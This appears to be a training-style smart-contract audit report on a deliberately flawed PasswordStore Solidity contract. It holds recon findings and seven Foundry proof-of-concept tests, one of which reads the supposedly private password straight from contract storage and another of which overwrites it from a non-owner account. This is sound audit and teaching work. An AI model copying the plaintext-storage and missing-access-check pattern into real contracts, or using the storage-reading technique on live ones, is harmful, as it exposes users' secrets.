# PasswordStore - Audit Report

## Flow assumptions

- Initial:
    - users password mapping -> Everything initially has default state: 0x0000...0 (The initial|Genesis truth)
        - Reality1: a simple users to passwords mapping i.e., address -> bytes32
        - Reality2: users with mapping i.e., address -> uint256 -> bytes32 : user -> passwordID -> password

    - owner: default 0x000...0 (The initial|Genesis truth)

- Deployer or Owner -> deploys the contract -> constructor hits on runtime -> sets owner

- PasswordStore ->
    - storePassword ->
        - Pre-conditions:
            - If Plain password (bad design choice): password length must be greater than zero or eight chars (based on design choice), password must not be too generic, password must contain special punctuations
            - Hashed password(not a chosen design): Hash must be irreversible, Hash must not be too generic, could be vulnerable to brute-force, rainbow table attacks, dictionary attacks
            - Password can't be overwritten
            - only owner can set the password
        - Case1: users -> storePassword(theirPassowrd) -> encryption (keccak256?, sha256, etc) -> hash -> users password mapping update (state changed) reality change -> announcement for off-chain apis (does off-chain tools worth observation specifically for this type of application)
        - Case2: user -> storePassword(theirPassowrd) -> already have a stored password -> users can have multiple passwords for multiple purposes -> should reject the transaction or store all passwords mapped to associated users -> announcement for off-chain apis(same question as asked above)
        - Post-conditions: password securely get stored (reality updated), announcement must not contain the password or password hash.

    - retrievePassword:
        - Pre-conditions:
            - users must have a stored password
            - only owner can retrieve the password
        - Case1: retrievePassword() -> returns stored password
        - Case2: retrievePassword(passwordID) -> returns stored password
        - Post-conditions: Announcement must not contain the retrieved password or password hash.
    

## Invariants

- Password must not be exposable to anyone other than associated user(s) | owner(s).

## Expected Bad circumstances

- Owner bypass
- Anyone can set the password
- Anyone can retrieve the password
- Password too weak
- Empty password or password with zero or undesired length
- Password visible to everyone (hash or plain)
- Password not hashed
- DoS on storing password due to hash function failure
- Password overwrite
- DoS on password retrieval: Fail to retrieve password
- Privacy issue: Exposing users addresses to the public, adversaries get to know users passwordBase|passwordStore.
- deployer forgets to set msg.sender as the owner


## Recon

- s_password:
    - @info: storing plain password
    - @danger: visible to everyone on mempool

    - @info: Not so private and secure password storage
    - @danger: A skilled or seasoned solidity dev can access the password from low level.

- setPassword (function):
    - @info: Missing owner check
    - @danger: Anyone can set password.

    - @info: missing password hash mechanism
    - @danger: plain text passwords are vulnerable

    - @info: missing password length check
    - @danger: empty password commit does nothing but consumes GAS

    - @info: missing password difficulty check
    - @danger: weak passwords can be broken easily

- getPassword:
    - @info: Invalid natSpec @param
    - @danger: Mislead Readers, community devs, auditors

    - @info: returns plain password
    - @danger: Visible on mempool and block explorer

## PoCs:

### PoC1 - test_anyone_can_see_the_stored_password:

```solidity
function test_anyone_can_see_the_stored_password() public {
    // owner sets their password
    string memory expectedPassword = "super$3cureP@$$w0rd believe me it's really a secure password!";
    vm.startPrank(owner);
    passwordStore.setPassword(expectedPassword);
    vm.stopPrank();

    // owner checks their password
    vm.startPrank(owner);
    string memory storedPassword = passwordStore.getPassword();
    vm.stopPrank();
    console.log("password: ", storedPassword);

    // owner verifies their stored password
    assert(bytes(storedPassword).length > 0);
    assertEq(storedPassword, expectedPassword);

    // Adversary comes in to steal the password...
    // bytes32 storageSlot = keccak256(abi.encodePacked(uint256(1)));
    bytes32 storageSlot = bytes32(uint256(1));

    bytes32 storedData = vm.load(address(passwordStore), storageSlot);

    uint256 storedDataLength = uint256(uint8(storedData[31]) / 2);

    string memory actualPassword;
    if (storedDataLength < 32) {
        for (uint256 i; i < 31; i++) {
            actualPassword = string(abi.encodePacked(actualPassword, storedData[i]));
        }
    } else {
        uint256 numChunks = storedDataLength % 32 == 0 ? (storedDataLength / 32) : (storedDataLength / 32) + 1;

        for (uint256 i; i < numChunks; i++) {
            storageSlot = bytes32(uint256(keccak256(abi.encodePacked(uint256(1)))) + i);
            storedData = vm.load(address(passwordStore), storageSlot);

            bool dataFlag;
            string memory passwordChunk;
            for (uint256 j = 31; j >= 0; j--) {
                if (storedData[j] == 0x00 && !dataFlag) continue;
                if (storedData[j] != 0x00 && !dataFlag) dataFlag = true;

                passwordChunk = string(abi.encodePacked(storedData[j], passwordChunk));
                if (j == 0) break;
            }
            actualPassword = string(abi.encodePacked(actualPassword, passwordChunk));
        }
    }

    console.log("expected password: ", expectedPassword);
    console.log("actual password  : ", actualPassword);
    console.log("expected password length: ", bytes(expectedPassword).length);
    console.log("actual password   length: ", bytes(actualPassword).length);
    assertEq(bytes(expectedPassword).length, bytes(actualPassword).length);
    assertEq(expectedPassword, actualPassword);
}
```

### PoC2 - test_password_is_visible_in_mempool_and_block_explorer:

```solidity
function test_password_is_visible_in_mempool_and_block_explorer() public {
    // owner sets their password
    string memory expectedPassword = "super$3cureP@$$w0rd";
    vm.startPrank(owner);
    // @BUG: Exposed to block explorer and mempool.
    passwordStore.setPassword(expectedPassword);
    vm.stopPrank();

    // owner checks their password
    vm.startPrank(owner);
    // @BUG: Again exposed to block explorer and mempool.
    string memory storedPassword = passwordStore.getPassword();
    vm.stopPrank();
    console.log("password: ", storedPassword);

    // owner verifies their stored password
    assert(bytes(storedPassword).length > 0);
    assertEq(storedPassword, expectedPassword);
}
```

### PoC3 - test_anyone_can_set_and_overwrite_the_password:

```solidity
function test_anyone_can_set_and_overwrite_the_password() public {
    // owner sets their password
    string memory expectedPassword = "super$3cureP@$$w0rd";
    vm.startPrank(owner);
    passwordStore.setPassword(expectedPassword);
    vm.stopPrank();

    // Attacker comes in and tries to overwrite owner's password
    string memory maliciousPassword = "you're pwned ;`)";
    vm.startPrank(ADVERSARY);
    // heck no, attacker has overwritten owner's password
    passwordStore.setPassword(maliciousPassword);
    vm.stopPrank();

    // proof
    // owner needed their password, they tried to retrieve so....
    vm.startPrank(owner);
    string memory actualPassword = passwordStore.getPassword();
    vm.stopPrank();

    // what the big banana pant?????????........... that's loki hahahaha
    assertNotEq(expectedPassword, actualPassword);
}
```

### PoC4 - test_no_hash_mechanism_for_password:

```solidity
function test_no_hash_mechanism_for_password() public {
    // owner sets their password
    string memory expectedPassword = "super$3cureP@$$w0rd"; // input: plain password
    vm.startPrank(owner);
    passwordStore.setPassword(expectedPassword);
    vm.stopPrank();

    // proof
    vm.startPrank(owner);
    string memory actualPassword = passwordStore.getPassword(); // output: plain password
    vm.stopPrank();

    assertEq(expectedPassword, actualPassword);
}
```

### PoC5 - test_missing_password_length_check:

```solidity
function test_missing_password_length_check() public {
    // owner sets their password
    string memory expectedPassword = ""; // Input: Literally empty password
    vm.startPrank(owner);
    passwordStore.setPassword(expectedPassword);
    vm.stopPrank();

    // proof
    vm.startPrank(owner);
    string memory actualPassword = passwordStore.getPassword(); // Output: empty password
    vm.stopPrank();

    assertEq(expectedPassword, actualPassword);
}
```

### PoC6 - test_missing_generic_weak_passwords_check:

```solidity
function test_missing_generic_weak_passwords_check() public {
    // owner sets their password
    string memory expectedPassword = "admin123@"; // Input: Generic Weak password
    vm.startPrank(owner);
    passwordStore.setPassword(expectedPassword);
    vm.stopPrank();

    // proof
    vm.startPrank(owner);
    string memory actualPassword = passwordStore.getPassword();
    vm.stopPrank();

    assertEq(expectedPassword, actualPassword);
}
```

### PoC7 - Invalid NatSpec hallucinate Devs, white hats, readers, researchers, and auditor:

```solidity
/*
    * @notice This allows only the owner to retrieve the password.
@>  // @info: Invalid natSpec @param    <--------------------------------------------------- here
@>  // @danger: Misleads Readers, community devs, auditors, etc
@>  * @param newPassword The new password to set. <------------------------------------------ this one
    */
function getPassword() external view returns (string memory) {
    if (msg.sender != s_owner) {
        revert PasswordStore__NotOwner();
    }
    // @info: returns plain password
    // @danger: Visible on mempool and block explorer
    return s_password;
}
```






<br/>
<br/>
<br/>
<br/>
<br/>

##### Auditor|Sec-Res|Hacker: *theirrationalone*